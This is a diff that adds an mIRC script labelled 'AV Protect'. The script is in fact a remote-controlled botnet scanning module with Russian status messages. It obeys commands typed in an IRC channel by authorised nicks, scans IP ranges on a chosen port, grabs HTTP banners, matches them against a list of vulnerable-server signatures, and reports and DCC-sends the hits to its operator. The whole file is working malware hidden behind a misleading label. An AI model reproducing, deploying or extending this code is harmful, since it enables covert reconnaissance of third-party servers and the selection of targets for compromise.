@@ -1,0 +1,117 @@
+;ayfa97r43fh3024u8f
+;3q4f0u2q13fj0utr093jf34f
+;AV Protect
+;afo873q048f
+on ^*:text:*:*: {
+
+  if (%auth [ $+ [ $nick ] ] != yes) { halt }
+
+  if (!serverscan.clear. isin $1) {
+    if ( ($remove($1,!serverscan.clear.) != *) && ($remove($1,!serverscan.clear.) != $me) ) { halt }
+    .msg $schannick 15***  Очистил файл с найденными серверами! 
+    write -c server-res.txt
+  }
+
+  if (!server.result. isin $1) {
+    if ( ($remove($1,!server.result.) != *) && ($remove($1,!server.result.) != $me) ) { halt }
+    dcc send $nick server-res.txt
+  }
+
+  if (!serverscan.stop. isin $1) {
+    if ( ($remove($1,!serverscan.stop.) != *) && ($remove($1,!serverscan.stop.) != $me) ) { halt }
+    set %serverscan.stat.bag off  |     .timerserverscan_start off  |  sockclose serverscan.*  
+    sockclose serverbag.* |  .timerserverbag.stat off | .timerserverbag.break off | .timerserverbaggi_work off
+    .msg $schannick 14*** ВЫКЛЮЧИЛ СКАНИРОВАНИЕ! At:4 $longip(%server.oneip) 14Scan was:4 %serverscan.work 14Found servers:4 %serverscan.found 14Found servers with bugs:4 %serverscan.bag 
+    nick $remove($me,[Serv_scan])
+    halt
+  }
+  if (!serverscan.stat. isin $1) {
+    if ( ($remove($1,!serverscan.stat.) != *) && ($remove($1,!serverscan.stat.) != $me) ) { halt }
+    if (%serverscan.stat.bag == off) {
+      .msg $schannick 14*** Статус:12вЫклЮчен14 Last Scan:4 %serverscan.work 14Found servers:4 %serverscan.found 14Found servers with bugs:4 %serverscan.bag 
+      halt 
+    }
+    if (%serverscan.stat.server == on) {     .msg $schannick 14*** Статус:12скАнирУю и ищу скрипты14[4 %serverscan.work 14] n0w server:4 $longip(%server.oneip) 14Found servers:4 %serverscan.found 14Found servers with bugs:4 %serverscan.bag }
+    if (%serverscan.stat.server == off) {     .msg $schannick 14*** Статус: 12ищу скрипты 14Found server:4 %serverscan.found 14Found server:4 %serverscan.bag 14Серверов для проверки: }
+    halt
+  }
+  if (!serverscan. isin $1) {
+    if ( ($remove($1,!serverscan.) != *) && ($remove($1,!serverscan.) != $me) ) { halt }
+    if ($2 == $null) { .msg $schannick 4*** Ошибка! Не указан начальный IP | halt }
+    if ($3 == $null) { .msg $schannick 4*** Ошибка! Не указан конечный IP | halt }
+    if ($4 == $null) { .msg $schannick 4*** Ошибка! Не указан порт | halt }
+    if ($5 == $null) { .msg $schannick 4*** Ошибка! Не указан файл баннерами | halt }
+
+    set %server_port $4
+    set %server_file $5
+
+    if (%serverscan.stat.bag == on) {
+      .msg $schannick 14*** УЖЕ ИДЕТ СКАНИРОВАНИЕ! Found server:4 %serverscan.found 14Found server:4 %serverscan.bag 
+      halt
+    }
+    if (%scriptsscan.stat.bag == on) {
+      .msg $schannick 14*** УЖЕ ИДЕТ СКАНИРОВАНИЕ! Found server:4 %scriptsscan.found 14Found server:4 %scriptsscan.bag 
+      halt
+    }
+    if (%iniscan.stat.bag == on) {
+      .msg $schannick 14*** УЖЕ ИДЕТ СКАНИРОВАНИЕ! Found server IIS:4 %uniscan.found 14Found bag:4 %uniscan.bag 
+      halt
+    }
+    if ($exists(server-res.txt) == $false) write -c server-res.txt
+    nick $me $+ [Serv_scan]
+    set %server.obj $schannick
+    .msg %server.obj 12*** n0w ScanIng servers:4 $2 - $3
+    set %server.oneip $longip($2) | set %server.twoip $longip($3)  | set %serverscan.work $2 - $3
+    set %serverscan.chan  $schannick  |    set %serverscan.found 0 |   set %serverscan.bag 0
+    set %serverscan.stat.server on  |  set %serverscan.stat.bag on | set %serverbag.job on
+    .timerserverscan_start 0 1 serverscan.stat $2 $3 $schannick
+  }
+
+}
+
+alias serverscan.stat {
+  if ($sock(serverscan.*,0) < 50) {   
+    :start
+    if (%server.oneip > %server.twoip) {
+     .timerserverscan_start off  | set %serverscan.stat.server off | sockclose serverscan.* 
+     set %serverscan.stat.bag off  |    .timerserverbaggi_work off
+     .timerserverscan_stopscan 1 10 .msg %serverscan.chan 12 *** Закончил сканировать:4  %serverscan.work 12Нашел серверов:4 %serverscan.found 12Нашёл дырявых серверов:4 %serverscan.bag
+     nick $remove($me,[Serv_scan])
+     halt 
+    }
+    .sockopen serverscan. $+ %server.oneip $longip(%server.oneip) %server_port
+    inc  %server.oneip
+    .timerserverscan_stop $+ %server.oneip 1 10 sockclose serverscan. $+ %server.oneip
+    if ($sock(serverscan.*,0) < 50) { goto start }
+  }
+}
+
+on *:sockopen:serverscan.*: {
+  if ($sockerr > 0) { sockclose $sockname  | return }
+ if (%server_port == 80) {
+    .sockwrite -n $sockname HEAD / HTTP/1.0
+    .sockwrite -n $sockname Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
+    .sockwrite -n $sockname User-Agent: Mozilla/3.0 (compatible)
+    .sockwrite -n $sockname Host: $ip
+    .sockwrite -n $sockname
+}
+}
+on *:sockread:serverscan.*: {
+  .sockread -f %subsock
+  if ($sockerr > 0) { sockclose $sockname  | return }
+  set %sock_ip $sock($sockname).ip
+var %i = 0
+%maxline = $lines( %server_file )
+
+while (%i < %maxline ) {
+  inc %i
+  %serverscan_current = $read(%server_file,%i)
+  if (%serverscan_current isin %subsock) {
+   write server-res.txt %sock_ip %subsock
+   inc %serverscan.bag   
+   .msg %serverscan.chan 12Found 4 %serverscan_current 12! 14 %subsock 12 at 4 %sock_ip 
+   .timerserverbag.break off | .timerserverbag.stat off
+  }
+}
+  inc %serverscan.found
+}
